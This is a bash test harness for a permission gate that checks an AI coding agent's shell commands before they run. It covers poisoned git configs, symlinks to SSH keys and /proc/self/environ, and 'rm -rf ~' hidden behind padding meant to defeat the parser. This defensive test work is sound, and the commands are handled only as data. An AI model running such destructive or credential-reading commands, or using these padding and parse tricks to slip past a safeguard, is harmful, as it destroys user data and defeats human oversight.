#!/usr/bin/env bash
# test-gate.sh — table-driven tests for the permission-manager v3 gate.
#
# Every case's command text is only ever DATA: it is placed in a JSON hook
# payload on gate.sh's stdin. Nothing here executes it; canary cases prove the
# gate does not either.
#
# Usage: bash tests/permission-manager/test-gate.sh [--rules-dir DIR] [--cases DIR] [filter]
#   --rules-dir DIR  load DIR as a user rule layer (PERMISSION_MANAGER_RULES_PATH)
#                    for every case, so your own rules run under the shipped harness
#   --cases DIR      also run every *.tsv in DIR (same format as cases/*.tsv)
#   filter           only run table cases whose command contains this text

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
PLUGIN="$SCRIPT_DIR/../../plugins-claude/permission-manager"
GATE="$PLUGIN/scripts/gate.sh"
FILTER=""
EXTRA_CASES=()
USER_RULES_DIR=""
while [[ $# -gt 0 ]]; do
  case "$1" in
    --rules-dir)
      [[ $# -ge 2 ]] || {
        echo "--rules-dir needs a directory" >&2
        exit 2
      }
      USER_RULES_DIR="$(cd "$2" && pwd)"
      shift 2
      ;;
    --cases)
      [[ $# -ge 2 ]] || {
        echo "--cases needs a directory" >&2
        exit 2
      }
      EXTRA_CASES+=("$(cd "$2" && pwd)")
      shift 2
      ;;
    *)
      FILTER="$1"
      shift
      ;;
  esac
done

PASS=0
FAIL=0

TMP=$(mktemp -d)
trap 'rm -rf "$TMP"' EXIT
mkdir -p "$TMP/home" "$TMP/cfg" "$TMP/work" "$TMP/tmp"
export HOME="$TMP/home" CLAUDE_CONFIG_DIR="$TMP/cfg" TMPDIR="$TMP/tmp"
unset PERMISSION_AUDIT_LOG PM_GATE_DEBUG PERMISSION_MANAGER_RULES_PATH PERMISSION_MANAGER_PROJECT_RULES
# Rule layers and their cache live under these; nothing outside $TMP is read.
export XDG_CONFIG_HOME="$TMP/xdg-config" XDG_CACHE_HOME="$TMP/xdg-cache"
[[ -n "$USER_RULES_DIR" ]] && export PERMISSION_MANAGER_RULES_PATH="$USER_RULES_DIR"
CANARY="$TMP/pm-canary-$$"

# Fixtures (case tables reach them as @TMP@/...; cwd is $TMP/work):
# - work, home/repo: clean git repos (git allow needs clean repo-local config)
# - evil-*: repos whose local config sets an exec-capable key (git must not allow)
# - symlinks in work pointing at secret / persistence paths (realpath checks)
# Config values are only ever written to files here, never run.
export GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_SYSTEM=/dev/null
mk_repo() { git init -q "$1"; }
mk_repo "$TMP/work"
mk_repo "$HOME/repo"
mkdir -p "$TMP/work/sub" "$TMP/norepo" "$HOME/.ssh" "$HOME/.config/systemd/user"
mk_repo "$TMP/evil-fsmonitor" && git config --file "$TMP/evil-fsmonitor/.git/config" core.fsmonitor "touch $CANARY"
mk_repo "$TMP/evil-textconv" && git config --file "$TMP/evil-textconv/.git/config" diff.x.textconv "touch $CANARY"
mk_repo "$TMP/evil-alias" && git config --file "$TMP/evil-alias/.git/config" alias.st "!touch $CANARY"
mk_repo "$TMP/evil-include" && printf '[core]\n\tpager = touch %s\n' "$CANARY" >"$TMP/evil-inc.cfg" &&
  git config --file "$TMP/evil-include/.git/config" include.path "$TMP/evil-inc.cfg"
mk_repo "$TMP/evil-wtconfig" && git config --file "$TMP/evil-wtconfig/.git/config" extensions.worktreeConfig true
mk_repo "$TMP/evil-filter" && git config --file "$TMP/evil-filter/.git/config" filter.x.clean "touch $CANARY"
mk_repo "$TMP/evil-cred" && git config --file "$TMP/evil-cred/.git/config" credential.helper "!touch $CANARY"
mk_repo "$TMP/ok-config" && git config --file "$TMP/ok-config/.git/config" user.name tester &&
  git config --file "$TMP/ok-config/.git/config" protocol.file.allow always
printf 'x\n' >"$TMP/work/plain.txt"
ln -s "$HOME/.ssh/id_rsa" "$TMP/work/link-key"
ln -s "$HOME/.ssh" "$TMP/work/sshdir"
ln -s "$HOME" "$TMP/work/homelink"
ln -s "$HOME/.bashrc" "$TMP/work/rc"
ln -s "$HOME/.config/systemd/user" "$TMP/work/units"
ln -s "$HOME/.ssh/authorized_keys" "$TMP/work/ak"
ln -s "$HOME/.ssh/id_rsa" "$TMP/work/a b"
ln -s "$HOME/.ssh/id_rsa" "$TMP/work/-dash"
ln -s "$HOME/.ssh/id_rsa" "$TMP/work/nl"$'\n'"key"
ln -s "$HOME/.ssh/id_rsa" "$TMP/work/g*lob"
ln -s "$TMP/work/link-key" "$TMP/work/chain"
ln -s /proc/self/environ "$TMP/work/env-link"
ln -s "$TMP/work/plain.txt" "$TMP/work/ok-link"
ln -s "$HOME/.npmrc" "$TMP/work/npmrc-link"
ln -s /proc/sysrq-trigger "$TMP/work/trigger"
ln -s "$HOME/.ssh" "$TMP/work/sub/up"
mkdir -p "$TMP/work/~" && ln -s "$HOME/.ssh/id_rsa" "$TMP/work/~/notes"
# red-team regressions: symlink then .. in git -C, poisoned keys git acts on, secret-dir repo
mkdir -p "$TMP/evil-fsmonitor/inner" "$HOME/sub" && ln -s "$TMP/evil-fsmonitor/inner" "$TMP/work/esub" && ln -s "$HOME/sub" "$TMP/work/hsub"
mk_repo "$TMP/evil-uploadpack" && git config --file "$TMP/evil-uploadpack/.git/config" remote.origin.uploadpack "touch $CANARY"
mk_repo "$TMP/evil-ext" && git config --file "$TMP/evil-ext/.git/config" protocol.ext.allow always
mk_repo "$TMP/evil-worktree" && git config --file "$TMP/evil-worktree/.git/config" core.worktree "$HOME"
mk_repo "$TMP/evil-insteadof" && git config --file "$TMP/evil-insteadof/.git/config" url.ext::x.insteadOf https://
mk_repo "$TMP/evil-submodule" && git config --file "$TMP/evil-submodule/.git/config" submodule.sm.url ./sm
# v3.1.1: a directory outside the cwd and /tmp, reached through a symlink
ln -s /usr/share "$TMP/work/sharelink"
mk_repo "$HOME/.password-store"
ln -s "$HOME/.ssh" "$TMP/work/sub/sshlink"

pass() {
  ((PASS++)) || true
}
fail() {
  printf "  \033[31m✗\033[0m %s  (%s)\n" "$1" "$2"
  ((FAIL++)) || true
}
check() { # check NAME CONDITION_EXIT_CODE DETAIL
  if [[ "$2" -eq 0 ]]; then pass; else fail "$1" "${3:-}"; fi
}

payload() { # payload COMMAND [MODE] [TOOL]
  jq -nc --arg c "$1" --arg m "${2:-default}" --arg t "${3:-Bash}" --arg cwd "$TMP/work" \
    '{session_id: "test-session", hook_event_name: "PreToolUse", tool_name: $t, permission_mode: $m, cwd: $cwd, tool_input: {command: $c}}'
}

# run_gate PAYLOAD — sets OUT, CODE, DECISION (stderr goes to $TMP/stderr).
run_gate() {
  CODE=0
  OUT=$(bash "$GATE" <<<"$1" 2>"$TMP/stderr") || CODE=$?
  if [[ -z "$OUT" ]]; then
    DECISION=PASS
  else
    DECISION=$(jq -er '.hookSpecificOutput.permissionDecision | ascii_upcase' <<<"$OUT" 2>/dev/null) || DECISION="BADJSON"
  fi
}

# --- table cases ---
run_cases() { # run_cases DIR — every *.tsv in DIR
  local file suite_name line expected cmd label
  for file in "$1"/*.tsv; do
    [[ -f "$file" ]] || continue
    suite_name=$(basename "$file" .tsv)
    while IFS= read -r line || [[ -n "$line" ]]; do
      [[ -z "$line" || "$line" == \#* ]] && continue
      expected="${line%%$'\t'*}"
      cmd=""
      [[ "$line" == *$'\t'* ]] && cmd="${line#*$'\t'}"
      if [[ "$cmd" == %b:* ]]; then
        cmd=$(printf '%b' "${cmd#%b:}")
      fi
      cmd="${cmd//@HOME@/$HOME}"
      cmd="${cmd//@CANARY@/$CANARY}"
      cmd="${cmd//@TMP@/$TMP}"
      [[ -n "$FILTER" && "$cmd" != *"$FILTER"* ]] && continue
      run_gate "$(payload "$cmd")"
      label="$suite_name: $expected  ${cmd//$'\n'/\\n}"
      if [[ $CODE -ne 0 ]]; then
        fail "$label" "exit $CODE"
      elif [[ "$DECISION" != "$expected" ]]; then
        fail "$label" "got $DECISION"
      else
        pass
      fi
    done <"$file"
  done
}
echo "permission-manager gate: table cases"
run_cases "$SCRIPT_DIR/cases"
for _d in ${EXTRA_CASES[@]+"${EXTRA_CASES[@]}"}; do
  echo "permission-manager gate: extra cases ($_d)"
  run_cases "$_d"
done
check "canary: command text was never executed" "$([[ ! -e "$CANARY" ]] && echo 0 || echo 1)" "$CANARY exists"

[[ -n "$FILTER" ]] && {
  echo "Total: $((PASS + FAIL))  PASS: $PASS  FAIL: $FAIL"
  [[ $FAIL -eq 0 ]]
  exit
}

# --- output schema ---
echo "permission-manager gate: protocol"
run_gate "$(payload 'git push -f')"
check "ask: hookSpecificOutput schema" \
  "$(jq -e '.hookSpecificOutput | .hookEventName == "PreToolUse" and .permissionDecision == "ask" and (.permissionDecisionReason | test("git-push-force"))' <<<"$OUT" >/dev/null && echo 0 || echo 1)" "$OUT"
check "ask: single line of stdout" "$([[ $(wc -l <<<"$OUT") -eq 1 ]] && echo 0 || echo 1)" "$OUT"
run_gate "$(payload 'ls -la')"
check "allow: hookSpecificOutput schema" \
  "$(jq -e '.hookSpecificOutput | .hookEventName == "PreToolUse" and .permissionDecision == "allow" and (.permissionDecisionReason | length > 0)' <<<"$OUT" >/dev/null && echo 0 || echo 1)" "$OUT"
run_gate "$(payload 'git push -f' bypassPermissions)"
check "bypassPermissions: silent even for danger" "$([[ -z "$OUT" && $CODE -eq 0 ]] && echo 0 || echo 1)" "$OUT"
run_gate "$(payload 'git push -f' auto)"
check "auto mode: still asks" "$([[ "$DECISION" == ASK ]] && echo 0 || echo 1)" "$DECISION"
run_gate "$(payload 'git push -f' default Edit)"
check "non-Bash tool: silent" "$([[ -z "$OUT" ]] && echo 0 || echo 1)" "$OUT"
run_gate 'not json at all {'
check "malformed hook input: silent, exit 0" "$([[ -z "$OUT" && $CODE -eq 0 ]] && echo 0 || echo 1)" "$OUT"
run_gate '{"tool_name":"Bash","tool_input":{"command":"ls"},"cwd":"relative/dir"}'
check "relative cwd: silent" "$([[ -z "$OUT" ]] && echo 0 || echo 1)" "$OUT"

# --- audit log ---
echo "permission-manager gate: audit log"
LOG="$CLAUDE_CONFIG_DIR/permission-audit.jsonl"
rm -f "$LOG"
run_gate "$(payload 'git reset --hard')"
check "audit: ask appended under CLAUDE_CONFIG_DIR" \
  "$(jq -se 'length == 1 and (.[0] | .decision == "ask" and .command == "git reset --hard" and (.reason | length > 0) and (.ts | length > 0) and .cwd != null)' "$LOG" >/dev/null 2>&1 && echo 0 || echo 1)" "$(cat "$LOG" 2>/dev/null)"
run_gate "$(payload 'echo x > out.txt')"
check "audit: passthrough not logged" "$([[ $(wc -l <"$LOG") -eq 1 ]] && echo 0 || echo 1)"
run_gate "$(payload 'ls')"
check "audit: allow logged" "$([[ $(wc -l <"$LOG") -eq 2 ]] && echo 0 || echo 1)"
long_cmd="git push -f; echo $(printf 'a%.0s' {1..600})"
run_gate "$(payload "$long_cmd")"
check "audit: command truncated to 200 chars" "$(jq -se '.[-1].command | length == 200' "$LOG" >/dev/null && echo 0 || echo 1)"
check "audit: new log created with mode 600" "$([[ $(stat -c %a "$LOG") == 600 ]] && echo 0 || echo 1)" "$(stat -c %a "$LOG")"
chmod 644 "$LOG"
run_gate "$(payload 'ls')"
check "audit: existing log narrowed to mode 600" "$([[ $(stat -c %a "$LOG") == 600 ]] && echo 0 || echo 1)" "$(stat -c %a "$LOG")"
PERMISSION_AUDIT_LOG="$TMP/custom/audit.jsonl" run_gate "$(payload 'git reset --hard')"
check "audit: PERMISSION_AUDIT_LOG override" "$([[ -s "$TMP/custom/audit.jsonl" ]] && echo 0 || echo 1)"

# --- rule layers ---
echo "permission-manager gate: rule layers"
SAVED_RULES_PATH="${PERMISSION_MANAGER_RULES_PATH:-}"
unset PERMISSION_MANAGER_RULES_PATH
CACHE_ROOT="$XDG_CACHE_HOME/permission-manager"
[[ -n "$USER_RULES_DIR" ]] || check "layers: no layer files, no cache created" "$([[ ! -e "$CACHE_ROOT" ]] && echo 0 || echo 1)" "$(ls "$CACHE_ROOT" 2>/dev/null)"

# Shipped layer fixtures and their cases (the --rules-dir / --cases pair).
LAYER_FILTER="$FILTER"
FILTER=""
PERMISSION_MANAGER_RULES_PATH="$SCRIPT_DIR/fixtures/rules.d" run_cases "$SCRIPT_DIR/layer-cases"
FILTER="$LAYER_FILTER"
check "layers: cache dir is private (700)" "$([[ $(stat -c %a "$CACHE_ROOT") == 700 ]] && echo 0 || echo 1)" "$(stat -c %a "$CACHE_ROOT")"
_key=$(find "$CACHE_ROOT" -mindepth 1 -maxdepth 1 -type d | head -n 1)
check "layers: cached tables are private (600)" "$([[ $(stat -c %a "$_key/danger.json") == 600 ]] && echo 0 || echo 1)" "$(stat -c %a "$_key/danger.json")"
check "layers: cache used for the push-target rule" "$([[ -e "$_key/uses-push-target" ]] && echo 0 || echo 1)"

# A bare lease push resolves its target: the current branch of the cwd repo.
LP="$TMP/layer-rules"
mkdir -p "$LP"
cp "$SCRIPT_DIR/fixtures/rules.d/10-release.json" "$LP/"
git -C "$TMP/work" symbolic-ref HEAD refs/heads/master
PERMISSION_MANAGER_RULES_PATH="$LP" run_gate "$(payload 'git push --force-with-lease')"
check "layers: bare lease push on master asks" "$([[ "$DECISION" == ASK ]] && echo 0 || echo 1)" "$DECISION"
git -C "$TMP/work" symbolic-ref HEAD refs/heads/feature/x
PERMISSION_MANAGER_RULES_PATH="$LP" run_gate "$(payload 'git push --force-with-lease')"
check "layers: bare lease push on a feature branch passes" "$([[ "$DECISION" == PASS ]] && echo 0 || echo 1)" "$DECISION"
# Pushes whose repo or ref set cannot be read from the cwd's branch must ask.
for _c in 'git checkout master && git push --force-with-lease' 'cd /tmp && git push --force-with-lease' 'git -C ../other push --force-with-lease' 'git -C "$R" push --force-with-lease' \
  "git push --force-with-lease origin 'refs/heads/*:refs/heads/*'" 'git push --force-with-lease --all origin' \
  "ssh host 'git push --force-with-lease'"; do
  PERMISSION_MANAGER_RULES_PATH="$LP" run_gate "$(payload "$_c")"
  check "layers: unresolvable lease push target asks: $_c" "$([[ "$DECISION" == ASK ]] && echo 0 || echo 1)" "$DECISION"
done
git -C "$TMP/work" symbolic-ref HEAD refs/heads/master

# Precedence: later layers override earlier ones; disable removes shipped ids.
rm -rf "$LP" && mkdir -p "$LP/a" "$LP/b"
cat >"$LP/a/10.json" <<'EOF'
{"version": 1, "danger": [{"id": "layer.demo", "cmd": ["demo-tool"], "reason": "from layer A"}]}
EOF
cat >"$LP/b/10.json" <<'EOF'
{"version": 1, "override": {"layer.demo": {"reason": "from layer B"}}, "disable": ["git-push-force"]}
EOF
PERMISSION_MANAGER_RULES_PATH="$LP/a" run_gate "$(payload 'demo-tool x')"
check "layers: added rule asks" "$([[ "$DECISION" == ASK ]] && grep -q 'from layer A' <<<"$OUT" && echo 0 || echo 1)" "$OUT"
PERMISSION_MANAGER_RULES_PATH="$LP/a:$LP/b" run_gate "$(payload 'demo-tool x')"
check "layers: later layer overrides an earlier layer's rule" "$([[ "$DECISION" == ASK ]] && grep -q 'from layer B' <<<"$OUT" && echo 0 || echo 1)" "$OUT"
PERMISSION_MANAGER_RULES_PATH="$LP/a:$LP/b" run_gate "$(payload 'git push -f')"
check "layers: disable removes a shipped rule" "$([[ "$DECISION" == PASS ]] && echo 0 || echo 1)" "$DECISION"
PERMISSION_MANAGER_RULES_PATH="$LP/a" run_gate "$(payload 'git push -f')"
check "layers: shipped rule still asks without the disable" "$([[ "$DECISION" == ASK ]] && echo 0 || echo 1)" "$DECISION"

# A repository can set env vars for hooks: a layer directory inside the repo is ignored.
mkdir -p "$TMP/work/.pm"
printf '{"version": 1, "disable": ["git-push-force"]}\n' >"$TMP/work/.pm/x.json"
rm -rf "$TMP/tmp/permission-manager-${UID:-0}"
PERMISSION_MANAGER_RULES_PATH="$TMP/work/.pm" run_gate "$(payload 'git push -f')"
check "layers: rule dir inside the repository is ignored" "$([[ "$DECISION" == ASK ]] && grep -q 'inside the repository' "$TMP/stderr" && echo 0 || echo 1)" "$DECISION $(cat "$TMP/stderr")"
rm -rf "$TMP/work/.pm"

# Project layer: only with PERMISSION_MANAGER_PROJECT_RULES=1, ask/deny only.
mkdir -p "$TMP/work/.claude/permission-manager"
PROJ="$TMP/work/.claude/permission-manager/p.json"
cat >"$PROJ" <<'EOF'
{"version": 1, "danger": [{"id": "proj.demo", "cmd": ["proj-tool"], "reason": "from the project"}]}
EOF
run_gate "$(payload 'proj-tool x')"
check "layers: project rules are off by default" "$([[ "$DECISION" == PASS ]] && echo 0 || echo 1)" "$DECISION"
PERMISSION_MANAGER_PROJECT_RULES=1 run_gate "$(payload 'proj-tool x')"
check "layers: project rule asks when enabled" "$([[ "$DECISION" == ASK ]] && echo 0 || echo 1)" "$DECISION"
cat >"$PROJ" <<'EOF'
{"version": 1, "danger": [{"id": "proj.demo", "cmd": ["proj-tool"], "reason": "from the project"}],
 "allow": [{"id": "proj.allow-all", "cmd": ["git"]}]}
EOF
rm -rf "$TMP/tmp/permission-manager-${UID:-0}"
PERMISSION_MANAGER_PROJECT_RULES=1 run_gate "$(payload 'proj-tool x')"
check "layers: project file with an allow section is skipped whole" "$([[ "$DECISION" == PASS ]] && echo 0 || echo 1)" "$DECISION"
check "layers: skipped project file is reported on stderr" "$(grep -q 'allow.*not allowed in the project layer' "$TMP/stderr" && echo 0 || echo 1)" "$(cat "$TMP/stderr")"
cat >"$PROJ" <<'EOF'
{"version": 1, "disable": ["git-push-force"], "override": {"git-push-force": {"when": [{"has": ["--nope"]}]}}}
EOF
PERMISSION_MANAGER_PROJECT_RULES=1 run_gate "$(payload 'git push -f')"
check "layers: project layer cannot disable or override shipped rules" "$([[ "$DECISION" == ASK ]] && echo 0 || echo 1)" "$DECISION"
rm -rf "$TMP/work/.claude"

# A malformed file is skipped by itself; shipped rules and the good file apply.
rm -rf "$LP" && mkdir -p "$LP"
printf '{ not json' >"$LP/00-broken.json"
cat >"$LP/05-typo.json" <<'EOF'
{"version": 1, "danger": [{"id": "typo.rule", "cmd": ["typo-tool"], "when": [{"hass": ["-x"]}], "reason": "typo"}]}
EOF
# Wrong-typed fields would make engine.jq throw and silence the whole gate.
cat >"$LP/06-fields.json" <<'EOF'
{"version": 1, "regex": {"badname": "^x$"},
 "danger": [{"id": "f.re", "cmd_re": "(", "reason": "r"}, {"id": "f.sub", "cmd": ["git"], "sub": "push", "reason": "r"},
            {"id": "f.args", "cmd": ["x"], "args": "@nope", "reason": "r"}],
 "allow": [{"id": "f.allow", "cmd": ["git"], "sub": ["push"], "when": [{"push_target_re": "^feature/"}]}],
 "override": {"git-push-force": {"verdict": "allow", "cmd": "git"}}}
EOF
cat >"$LP/10-good.json" <<'EOF'
{"version": 1, "danger": [{"id": "good.rule", "cmd": ["good-tool"], "reason": "from the good file"}]}
EOF
rm -rf "$TMP/tmp/permission-manager-${UID:-0}"
rm -f "$LOG"
PERMISSION_MANAGER_RULES_PATH="$LP" run_gate "$(payload 'good-tool x')"
check "layers: good file applies next to broken ones" "$([[ "$DECISION" == ASK ]] && grep -q 'from the good file' <<<"$OUT" && echo 0 || echo 1)" "$OUT"
check "layers: broken files reported once on stderr" "$(grep -q 'not valid JSON' "$TMP/stderr" && grep -q 'unknown when clause key' "$TMP/stderr" && grep -q '06-fields' "$TMP/stderr" && echo 0 || echo 1)" "$(cat "$TMP/stderr")"
check "layers: RULES_ERROR audit line written" "$(jq -se 'any(.[]; .decision == "RULES_ERROR")' "$LOG" >/dev/null 2>&1 && echo 0 || echo 1)" "$(cat "$LOG" 2>/dev/null)"
PERMISSION_MANAGER_RULES_PATH="$LP" run_gate "$(payload 'typo-tool -x')"
check "layers: rule with a misspelled clause is skipped, not silent-false" "$([[ "$DECISION" == PASS ]] && echo 0 || echo 1)" "$DECISION"
PERMISSION_MANAGER_RULES_PATH="$LP" run_gate "$(payload 'git push -f')"
check "layers: shipped asks still fire with broken layer files" "$([[ "$DECISION" == ASK ]] && echo 0 || echo 1)" "$DECISION"
PERMISSION_MANAGER_RULES_PATH="$LP" run_gate "$(payload 'git status')"
check "layers: allow still works after rejected field files" "$([[ "$DECISION" == ALLOW ]] && echo 0 || echo 1)" "$DECISION"
check "layers: error note only once per session" "$([[ ! -s "$TMP/stderr" ]] && echo 0 || echo 1)" "$(cat "$TMP/stderr")"

# Cache invalidation: a changed file produces a new merged set.
rm -rf "$LP" && mkdir -p "$LP"
cat >"$LP/10.json" <<'EOF'
{"version": 1, "danger": [{"id": "cache.one", "cmd": ["cache-one"], "reason": "one"}]}
EOF
PERMISSION_MANAGER_RULES_PATH="$LP" run_gate "$(payload 'cache-two y')"
check "layers: second rule not defined yet" "$([[ "$DECISION" == PASS ]] && echo 0 || echo 1)" "$DECISION"
_before=$(find "$CACHE_ROOT" -mindepth 1 -maxdepth 1 -type d | wc -l)
cat >"$LP/10.json" <<'EOF'
{"version": 1, "danger": [{"id": "cache.one", "cmd": ["cache-one"], "reason": "one"}, {"id": "cache.two", "cmd": ["cache-two"], "reason": "two"}]}
EOF
PERMISSION_MANAGER_RULES_PATH="$LP" run_gate "$(payload 'cache-two y')"
check "layers: cache invalidated when a rule file changes" "$([[ "$DECISION" == ASK ]] && echo 0 || echo 1)" "$DECISION"
_after=$(find "$CACHE_ROOT" -mindepth 1 -maxdepth 1 -type d | wc -l)
check "layers: changed file gets its own cache entry" "$([[ $_after -gt $_before ]] && echo 0 || echo 1)" "$_before -> $_after"
PERMISSION_MANAGER_RULES_PATH="$LP" run_gate "$(payload 'cache-two y')"
_again=$(find "$CACHE_ROOT" -mindepth 1 -maxdepth 1 -type d | wc -l)
check "layers: unchanged files reuse the cache entry" "$([[ "$DECISION" == ASK && $_again -eq $_after ]] && echo 0 || echo 1)" "$_after -> $_again"

if [[ -n "$SAVED_RULES_PATH" ]]; then export PERMISSION_MANAGER_RULES_PATH="$SAVED_RULES_PATH"; fi
rm -rf "$LP" "$XDG_CACHE_HOME"

# --- failure modes ---
echo "permission-manager gate: failure modes"
big="echo $(printf 'x%.0s' {1..21000}); git push -f"
start=$EPOCHREALTIME
run_gate "$(payload "$big")"
elapsed_ms=$(((${EPOCHREALTIME/./} - ${start/./}) / 1000))
check "command > 20 KB: ask (oversize)" "$([[ "$DECISION" == ASK && $CODE -eq 0 ]] && grep -q oversize <<<"$OUT" && echo 0 || echo 1)" "$DECISION"
check "command > 20 KB: fast (${elapsed_ms} ms < 1000)" "$([[ $elapsed_ms -lt 1000 ]] && echo 0 || echo 1)"
# Padding after a danger: shfmt's JSON grows quadratically with pipeline
# length, so a long tail must end in a fast ask, never a timed-out passthrough.
pipeline() { # pipeline N STAGE — "STAGE|STAGE|..." N times
  local s="$2" i
  for ((i = 1; i < $1; i++)); do s+="|$2"; done
  printf '%s' "$s"
}
for n in 1000 3000; do
  start=$EPOCHREALTIME
  run_gate "$(payload "rm -rf ~; $(pipeline "$n" ls)")"
  elapsed_ms=$(((${EPOCHREALTIME/./} - ${start/./}) / 1000))
  check "padding: rm -rf ~ + $n-stage pipeline asks" "$([[ "$DECISION" == ASK ]] && echo 0 || echo 1)" "$DECISION"
  check "padding: $n-stage pipeline fast (${elapsed_ms} ms < 3000)" "$([[ $elapsed_ms -lt 3000 ]] && echo 0 || echo 1)"
done
deep=$(printf '(%.0s' {1..3000})ls$(printf ')%.0s' {1..3000})
start=$EPOCHREALTIME
run_gate "$(payload "rm -rf ~; $deep")"
elapsed_ms=$(((${EPOCHREALTIME/./} - ${start/./}) / 1000))
check "padding: rm -rf ~ + 3000 nested subshells asks (${elapsed_ms} ms < 3000)" "$([[ "$DECISION" == ASK && $elapsed_ms -lt 3000 ]] && echo 0 || echo 1)" "$DECISION"
# shellcheck disable=SC2016 # literal $( ... ) nesting, data only
run_gate "$(payload "rm -rf ~; echo $(printf '$(echo %.0s' {1..2000})x$(printf ')%.0s' {1..2000})")"
check "padding: nesting beyond shfmt's depth limit asks" "$([[ "$DECISION" == ASK ]] && grep -q oversize <<<"$OUT" && echo 0 || echo 1)" "$DECISION"
run_gate "$(payload "$(pipeline 250 ls)")"
check "oversize: 250 harmless commands ask, never allow" "$([[ "$DECISION" == ASK ]] && grep -q oversize <<<"$OUT" && echo 0 || echo 1)" "$DECISION"
run_gate "$(payload "$(pipeline 50 ls)")"
check "50-stage read-only pipeline still allowed" "$([[ "$DECISION" == ALLOW ]] && echo 0 || echo 1)" "$DECISION"
# A tree deeper than jq 1.6/1.7's parse limit (about 61 pipe stages) used to
# make jq fail and the gate pass through, losing the danger ask.
run_gate "$(payload "git push -f; $(pipeline 130 ls)")"
check "depth: git push -f + 130-stage pipeline asks, never passes through" "$([[ "$DECISION" == ASK ]] && grep -q oversize <<<"$OUT" && echo 0 || echo 1)" "$DECISION"
run_gate "$(payload "$(pipeline 57 ls)")"
check "depth: 57-stage pipeline (over MAX_AST_DEPTH) asks" "$([[ "$DECISION" == ASK ]] && grep -q 'nested over' <<<"$OUT" && echo 0 || echo 1)" "$DECISION"
# shellcheck disable=SC2016 # literal $( ... ) nesting, data only
run_gate "$(payload "echo $(printf '$(echo %.0s' {1..20})x$(printf ')%.0s' {1..20})")"
check "depth: 20 nested \$( ) (deep without pipes) asks" "$([[ "$DECISION" == ASK ]] && grep -q oversize <<<"$OUT" && echo 0 || echo 1)" "$DECISION"
# Parse failures ask: bash runs the complete statements before a syntax error,
# and shfmt rejects some syntax bash accepts.
run_gate "$(payload $'git push -f\n(')"
check "parse error: git push -f then a stray ( asks (parse-error)" "$([[ "$DECISION" == ASK ]] && grep -q parse-error <<<"$OUT" && echo 0 || echo 1)" "$DECISION"
run_gate "$(payload 'git push -f; ! ! ls')"
check "parse error: shfmt-only rejection (! ! ls) asks" "$([[ "$DECISION" == ASK ]] && grep -q parse-error <<<"$OUT" && echo 0 || echo 1)" "$DECISION"
run_gate "$(payload "bash -c $'git push -f\\n('")"
check "parse error: bash -c payload with danger prefix asks" "$([[ "$DECISION" == ASK ]] && grep -q parse-error <<<"$OUT" && echo 0 || echo 1)" "$DECISION"
run_gate "$(payload "bash -c $'echo RAN1\\n('")"
check "parse error: bash -c payload with harmless prefix asks" "$([[ "$DECISION" == ASK ]] && grep -q parse-error <<<"$OUT" && echo 0 || echo 1)" "$DECISION"
run_gate "$(payload 'ls -la; ! ls')"
check "parse error: valid single negation still allowed" "$([[ "$DECISION" == ALLOW ]] && echo 0 || echo 1)" "$DECISION"
# Write targets past MAX_PATHS used to skip the symlink check silently.
pad=""
for i in {0..129}; do pad+="; : > f$i"; done
run_gate "$(payload "echo x > rc$pad")"
check "write-check: symlinked rc + 130 padding targets asks (write-check)" "$([[ "$DECISION" == ASK ]] && grep -q write-check <<<"$OUT" && echo 0 || echo 1)" "$DECISION"
run_gate "$(payload "echo x > out.txt; : > f0; : > f1")"
check "write-check: a few plain write targets still pass through" "$([[ "$DECISION" == PASS ]] && echo 0 || echo 1)" "$DECISION"

BIN="$TMP/bin-nojq"
mkdir -p "$BIN"
for t in shfmt timeout base64 mkdir; do
  p=$(command -v "$t" 2>/dev/null) && ln -s "$p" "$BIN/$t"
done
BASH_BIN=$(command -v bash)
CODE=0
OUT=$(PATH="$BIN" PM_GATE_NO_PROBE=1 "$BASH_BIN" "$GATE" <<<"$(payload 'git push -f')" 2>"$TMP/stderr") || CODE=$?
check "missing jq: passthrough, exit 0" "$([[ -z "$OUT" && $CODE -eq 0 ]] && echo 0 || echo 1)" "$OUT"
check "missing jq: one stderr note" "$(grep -q 'jq not found' "$TMP/stderr" && echo 0 || echo 1)" "$(cat "$TMP/stderr")"

BIN="$TMP/bin-noshfmt"
mkdir -p "$BIN"
for t in jq timeout base64 mkdir; do
  p=$(command -v "$t" 2>/dev/null) && ln -s "$p" "$BIN/$t"
done
CODE=0
OUT=$(PATH="$BIN" PM_GATE_NO_PROBE=1 "$BASH_BIN" "$GATE" <<<"$(payload 'git push -f')" 2>"$TMP/stderr") || CODE=$?
check "missing shfmt: passthrough, exit 0" "$([[ -z "$OUT" && $CODE -eq 0 ]] && echo 0 || echo 1)" "$OUT"
check "missing shfmt: stderr note" "$(grep -q 'shfmt not found' "$TMP/stderr" && echo 0 || echo 1)" "$(cat "$TMP/stderr")"
OUT=$(PATH="$BIN" PM_GATE_NO_PROBE=1 "$BASH_BIN" "$GATE" <<<"$(payload 'ls')" 2>"$TMP/stderr") || true
check "missing shfmt: note only once per session" "$([[ ! -s "$TMP/stderr" ]] && echo 0 || echo 1)" "$(cat "$TMP/stderr")"

# Fake shfmt binaries: an AST with an unknown node type, garbage output, and a
# hang. Each must end in passthrough.
fake_shfmt() { # fake_shfmt DIR SCRIPT_BODY
  mkdir -p "$1"
  printf '#!%s\n%s\n' "$BASH_BIN" "$2" >"$1/shfmt"
  chmod +x "$1/shfmt"
}
REAL_SHFMT=$(command -v shfmt)
fake_shfmt "$TMP/fake-unknown" "\"$REAL_SHFMT\" \"\$@\" | jq -c '(.. | objects | select(.Type? == \"CallExpr\")) |= (.Type = \"FutureNode\")'"
run_gate_path() { # run_gate_path DIR COMMAND
  CODE=0
  OUT=$(PATH="$1:$PATH" bash "$GATE" <<<"$(payload "$2")" 2>/dev/null) || CODE=$?
}
run_gate_path "$TMP/fake-unknown" 'ls -la'
check "unknown AST node type: passthrough" "$([[ -z "$OUT" && $CODE -eq 0 ]] && echo 0 || echo 1)" "$OUT"
fake_shfmt "$TMP/fake-garbage" 'echo "{\"Type\":\"File\",\"Stmts\":[{\"Cmd\":"'
run_gate_path "$TMP/fake-garbage" 'ls -la'
check "truncated shfmt JSON: passthrough" "$([[ -z "$OUT" && $CODE -eq 0 ]] && echo 0 || echo 1)" "$OUT"
fake_shfmt "$TMP/fake-noprobe" "\"$REAL_SHFMT\" \"\$@\" | jq -c '.Stmts |= .[5:]'"
run_gate_path "$TMP/fake-noprobe" 'ls -la'
